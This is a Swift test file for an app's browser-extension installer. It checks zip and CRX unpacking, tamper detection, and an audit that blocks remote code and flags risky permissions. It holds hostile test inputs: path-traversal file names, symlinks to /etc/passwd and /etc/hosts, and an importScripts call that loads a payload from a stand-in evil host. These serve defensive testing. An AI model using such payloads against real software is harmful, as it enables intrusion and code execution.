import Foundation
import Testing
@testable import LilyCore

/// Builds zip archives in memory (stored or deflated entries) for the reader tests.
struct ZipBuilder {
    struct Entry { var name: String; var data: Data; var deflate = true; var unixMode: UInt32 = 0o100644; var flags: UInt16 = 0; var crc: UInt32? = nil }
    var entries: [Entry] = []

    mutating func add(_ name: String, _ text: String, deflate: Bool = true) { entries.append(Entry(name: name, data: Data(text.utf8), deflate: deflate)) }

    func build() -> Data {
        var out = Data()
        var directory = Data()
        for entry in entries {
            let body = entry.deflate ? (try! (entry.data as NSData).compressed(using: .zlib) as Data) : entry.data
            let crc = entry.crc ?? CRC32.checksum(entry.data)
            let offset = UInt32(out.count)
            let name = Data(entry.name.utf8)
            let method: UInt16 = entry.deflate ? 8 : 0
            for part in [le32(0x0403_4b50), le16(20), le16(entry.flags), le16(method), le16(0), le16(0), le32(crc),
                         le32(UInt32(body.count)), le32(UInt32(entry.data.count)), le16(UInt16(name.count)), le16(0), name, body] {
                out.append(part)
            }
            for part in [le32(0x0201_4b50), le16(0x031E), le16(20), le16(entry.flags), le16(method), le16(0), le16(0), le32(crc),
                         le32(UInt32(body.count)), le32(UInt32(entry.data.count)), le16(UInt16(name.count)), le16(0), le16(0),
                         le16(0), le16(0), le32(entry.unixMode << 16), le32(offset), name] {
                directory.append(part)
            }
        }
        let directoryOffset = UInt32(out.count)
        out.append(directory)
        for part in [le32(0x0605_4b50), le16(0), le16(0), le16(UInt16(entries.count)), le16(UInt16(entries.count)),
                     le32(UInt32(directory.count)), le32(directoryOffset), le16(0)] {
            out.append(part)
        }
        return out
    }

    private func le16(_ v: UInt16) -> Data { Data([UInt8(v & 0xFF), UInt8(v >> 8)]) }
    private func le32(_ v: UInt32) -> Data { Data((0..<4).map { UInt8((v >> (8 * $0)) & 0xFF) }) }
}

private let manifestV3 = #"{"name": "T", "version": "1", "manifest_version": 3, "name": "Test", "version": "1.0", "permissions": ["storage"]}"#

@Suite struct ExtensionPackageTests {
    @Test func crcMatchesTheStandardCheckValue() {
        #expect(CRC32.checksum(Data("123456789".utf8)) == 0xCBF4_3926)
    }

    @Test func readsStoredAndDeflatedEntriesAndUnwrapsTheTopFolder() throws {
        var zip = ZipBuilder()
        zip.add("my-ext/manifest.json", manifestV3)
        zip.add("my-ext/background.js", String(repeating: "console.log('hi');\n", count: 50), deflate: true)
        zip.add("my-ext/icons/16.png", "PNG", deflate: false)
        zip.add("my-ext/.DS_Store", "junk")
        let package = try ExtensionPackage(files: ExtensionPackage.unzip(zip.build()))
        #expect(Set(package.files.keys) == ["manifest.json", "background.js", "icons/16.png"])
        #expect(String(decoding: package.files["background.js"]!, as: UTF8.self).hasPrefix("console.log"))
    }

    @Test func crxPackagesAreUnwrapped() throws {
        var zip = ZipBuilder()
        zip.add("manifest.json", manifestV3)
        let header = Data("signed-data-protobuf".utf8)
        var crx = Data("Cr24".utf8) + Data([3, 0, 0, 0]) + Data([UInt8(header.count), 0, 0, 0])
        crx += header + zip.build()
        let payload = try #require(ExtensionPackage.crxPayload(crx))
        #expect(try ExtensionPackage(files: ExtensionPackage.unzip(payload)).manifest != nil)
        #expect(ExtensionPackage.crxPayload(zip.build()) == nil)
    }

    @Test func archivesCannotEscapeLinkOrLie() throws {
        func archive(_ entry: ZipBuilder.Entry) -> Data {
            var zip = ZipBuilder()
            zip.add("manifest.json", manifestV3)
            zip.entries.append(entry)
            return zip.build()
        }
        for name in ["../evil.js", "/etc/evil.js", "a/../../evil.js", "a\\evil.js", "a//b.js", "evil\u{202E}sj.js"] {
            #expect(throws: ExtensionPackage.Invalid.self, "\(name)") { try ExtensionPackage.unzip(archive(.init(name: name, data: Data("x".utf8)))) }
        }
        #expect(throws: ExtensionPackage.Invalid.self) { try ExtensionPackage.unzip(archive(.init(name: "link.js", data: Data("/etc/passwd".utf8), unixMode: 0o120777))) }
        #expect(throws: ExtensionPackage.Invalid.self) { try ExtensionPackage.unzip(archive(.init(name: "secret.js", data: Data("x".utf8), flags: 1))) }
        #expect(throws: ExtensionPackage.Invalid.self) { try ExtensionPackage.unzip(archive(.init(name: "a.js", data: Data("x".utf8), crc: 1))) }
        #expect(throws: ExtensionPackage.Invalid.self) { try ExtensionPackage.unzip(Data("not a zip at all, definitely".utf8)) }
        #expect(throws: ExtensionPackage.Invalid.self) { try ExtensionPackage(files: ["background.js": Data()]) }
    }

    @Test func pinnedCopiesHashTheSameAndDetectTampering() throws {
        let package = try ExtensionPackage(files: ["manifest.json": Data(manifestV3.utf8), "js/app.js": Data("run()".utf8)])
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("lily-pin-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: folder) }
        try package.write(to: folder)
        #expect(try ExtensionPackage.readFolder(folder).contentHash == package.contentHash)
        let attributes = try FileManager.default.attributesOfItem(atPath: folder.appendingPathComponent("js/app.js").path)
        #expect((attributes[.posixPermissions] as? Int) == 0o600)
        try Data("run(); steal()".utf8).write(to: folder.appendingPathComponent("js/app.js"))
        #expect(try ExtensionPackage.readFolder(folder).contentHash != package.contentHash)
    }

    @Test func foldersWithLinksAreRefused() throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("lily-link-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: folder) }
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try Data(manifestV3.utf8).write(to: folder.appendingPathComponent("manifest.json"))
        try FileManager.default.createSymbolicLink(at: folder.appendingPathComponent("leak.js"), withDestinationURL: URL(fileURLWithPath: "/etc/hosts"))
        #expect(throws: ExtensionPackage.Invalid.self) { try ExtensionPackage.readFolder(folder) }
    }
}

@Suite struct ExtensionAuditTests {
    func audit(_ manifest: String, _ files: [String: String] = [:]) throws -> ExtensionAudit {
        var all = files.mapValues { Data($0.utf8) }
        all["manifest.json"] = Data(manifest.utf8)
        return ExtensionAudit.scan(try ExtensionPackage(files: all))
    }

    @Test func aPlainExtensionHasNoWarnings() throws {
        let result = try audit(manifestV3, ["popup.js": "document.querySelector('#x').textContent = 'hi'"])
        #expect(!result.isBlocked && !result.findings.contains { $0.severity >= .warning })
    }

    @Test func remoteCodeBlocksInstallation() throws {
        #expect(try audit(#"{"name": "T", "version": "1", "manifest_version": 2, "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'"}"#).isBlocked)
        #expect(try audit(#"{"name": "T", "version": "1", "manifest_version": 2, "content_security_policy": "script-src 'self' https://cdn.example.com"}"#).isBlocked)
        #expect(try audit(#"{"name": "T", "version": "1", "manifest_version": 3, "content_security_policy": {"extension_pages": "script-src 'self' 'unsafe-inline'"}}"#).isBlocked)
        #expect(try audit(manifestV3, ["popup.html": #"<script src="https://cdn.example.com/lib.js"></script>"#]).isBlocked)
        #expect(try audit(manifestV3, ["bg.js": #"importScripts("https://evil.example/payload.js")"#]).isBlocked)
        #expect(try audit("not json").isBlocked)
    }

    @Test func riskyButCommonPatternsAreWarnings() throws {
        let sandbox = try audit(#"{"name": "T", "version": "1", "manifest_version": 3, "content_security_policy": {"sandbox": "sandbox allow-scripts; script-src 'self' 'unsafe-eval'"}}"#)
        #expect(!sandbox.isBlocked && sandbox.findings.contains { $0.severity == .warning })
        let code = try audit(#"{"name": "T", "version": "1", "manifest_version": 3, "permissions": ["cookies", "history"], "host_permissions": ["<all_urls>"], "update_url": "https://clients2.google.com/service/update2/crx"}"#,
                             ["bg.js": "const f = eval(x); fetch('https://www.google-analytics.com/collect'); fetch('https://api.example.net/v1')"])
        let titles = Set(code.findings.map(\.title))
        #expect(!code.isBlocked)
        #expect(titles.contains("Evaluates strings as code (eval)"))
        #expect(titles.contains("Sends data to analytics or error-reporting services"))
        #expect(titles.contains("Asks for sensitive permissions") && titles.contains("Can read and change every website"))
        #expect(titles.contains("Has an update address; Lily never updates it automatically"))
        #expect(code.findings.first { $0.title == "Mentions these servers" }?.detail.contains("api.example.net") == true)
        #expect(code.findings.first!.severity == .warning) // most severe first
    }

    /// Ad blockers list tracker hosts as data; only code that sends to them counts.
    @Test func blocklistsArentTelemetry() throws {
        let blocker = try audit(manifestV3, ["rules.js": #"const blocked = ["https://www.google-analytics.com/", "https://sentry.io/"];"#])
        #expect(!blocker.findings.contains { $0.title.hasPrefix("Sends data") })
        let tracker = try audit(manifestV3, ["bg.js": #"navigator.sendBeacon("https://o1.ingest.sentry.io/api/1/store/", body)"#])
        #expect(tracker.findings.first { $0.title.hasPrefix("Sends data") }?.detail == "o1.ingest.sentry.io")
    }

    /// `wasm-unsafe-eval` is MV3's allowed way to run WebAssembly, not general eval.
    @Test func wasmUnsafeEvalIsAllowed() throws {
        #expect(try !audit(#"{"name": "T", "version": "1", "manifest_version": 3, "content_security_policy": {"extension_pages": "script-src 'self' 'wasm-unsafe-eval'"}}"#).isBlocked)
    }
}

@Suite struct ExtensionIsolationTests {
    /// The page bridge answers only our injected scripts on web pages, never extension pages.
    @Test func bridgeAcceptsOnlyWebPageOrigins() {
        for scheme in ["https", "http", "file", "HTTPS"] { #expect(ScriptMessageBridge.acceptsMessages(fromScheme: scheme)) }
        for scheme in ["webkit-extension", "safari-web-extension", "chrome-extension", "about", "data", "blob", ""] {
            #expect(!ScriptMessageBridge.acceptsMessages(fromScheme: scheme), "\(scheme)")
        }
    }
}

@Suite struct PinnedCopyCleanupTests {
    @Test func onlyUnreferencedCopiesAreRemoved() async throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("lily-pins-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let kept = UUID().uuidString, orphan = UUID().uuidString
        for name in [kept, orphan, "not-a-copy"] {
            try FileManager.default.createDirectory(at: root.appendingPathComponent(name), withIntermediateDirectories: true)
        }
        await ExtensionLoader.removeFolders(in: root, except: [kept])
        #expect(Set(try FileManager.default.contentsOfDirectory(atPath: root.path)) == [kept, "not-a-copy"])
    }
}
